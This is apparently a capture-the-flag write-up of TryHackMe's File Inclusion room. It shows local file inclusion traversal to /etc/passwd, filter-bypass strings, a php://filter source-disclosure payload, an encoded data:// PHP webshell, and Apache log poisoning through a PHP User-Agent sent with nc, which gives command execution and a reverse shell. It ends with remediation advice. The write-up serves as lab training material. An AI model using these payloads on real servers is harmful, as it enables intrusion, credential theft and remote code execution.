# File Inclusion (LFI / RFI) — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy/Medium-yellow.svg)
![Topic](https://img.shields.io/badge/Topic-LFI_&_RFI-orange.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete penetration testing writeup and exploitation guide for the **File Inclusion** room on TryHackMe, demonstrating Local File Inclusion (LFI), Remote File Inclusion (RFI), PHP wrappers, and log poisoning to achieve Remote Code Execution.

---

## 📋 Executive Summary
File Inclusion occurs when web applications allow user input to control filesystem file path parameters in server-side include functions (`include`, `require`, `include_once`, `require_once` in PHP). This guide explores directory traversal, null-byte injection, filter evasion, PHP pseudo-protocol wrappers, and Apache access log poisoning to execute PHP webshells (`shell.php`).

* **Vulnerabilities:** Local File Inclusion (LFI), Remote File Inclusion (RFI), Log Poisoning -> RCE
* **Artifacts in Directory:**
  * `shell.php`: PHP reverse webshell payload

---

## 🔍 Stage 1: Local File Inclusion (LFI) & Filter Evasion

### 1.1 Basic Path Traversal
When input is appended to a directory prefix without sanitization:
```http
GET /index.php?page=../../../../etc/passwd HTTP/1.1
```

### 1.2 Bypassing Path Traversal Filters
* **Stripped `../` Replacement:** If the backend uses `str_replace("../", "", $page)` non-recursively:
  ```text
  ....//....//....//etc/passwd
  ```
* **URL Encoding:**
  * Single URL encoding: `%2e%2e%2f`
  * Double URL encoding: `%252e%252e%252f`
* **Enforced Extension Bypass (Null Byte / Trailing Dot):**
  * PHP < 5.3.4: Null byte truncation (`%00`) -> `../../../../etc/passwd%00`
  * Path truncation (long sequences of `/././.` exceeding 4096 bytes).

---

## 🧪 Stage 2: Advanced PHP Wrappers

### 2.1 Base64 Source Disclosure (`php://filter`)
When PHP source code is executed by the include statement, read raw source code encoded in Base64:
```text
php://filter/convert.base64-encode/resource=index.php
```
Decode the Base64 output to inspect database credentials and application logic:
```bash
echo "PD9waHAg..." | base64 -d
```

### 2.2 Direct Code Execution (`data://` & `php://input`)
If `allow_url_include = On` is enabled in `php.ini`:
```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```

---

## 💥 Stage 3: Remote Code Execution via Log Poisoning

When RFI is blocked, LFI can be escalated to RCE via Apache access log poisoning:

1. **Verify Log Read Access:**
   ```text
   /index.php?page=/var/log/apache2/access.log
   ```
2. **Inject PHP Code into User-Agent:**
   Using Netcat or curl, issue a request containing a PHP one-liner in the `User-Agent` header:
   ```bash
   nc <TARGET_IP> 80
   GET / HTTP/1.1
   Host: <TARGET_IP>
   User-Agent: <?php system($_GET['cmd']); ?>
   ```
3. **Execute Commands:**
   Request the poisoned access log via LFI with the command query parameter:
   ```text
   /index.php?page=/var/log/apache2/access.log&cmd=id
   ```
4. **Deploy Full Webshell:**
   Download and execute `shell.php` to obtain a persistent interactive reverse shell.

---

## 🛡️ Remediation
1. **Eliminate Dynamic Includes:** Hardcode allowable file paths or use indexed lookups:
   ```php
   $pages = ['home' => 'home.php', 'about' => 'about.php'];
   include $pages[$_GET['page']] ?? 'home.php';
   ```
2. **Harden `php.ini` Settings:**
   * `allow_url_fopen = Off`
   * `allow_url_include = Off`
   * `open_basedir = /var/www/html/`
3. **Restrict File Permissions:** Prevent the web server daemon (`www-data`) from reading system log files in `/var/log/`.
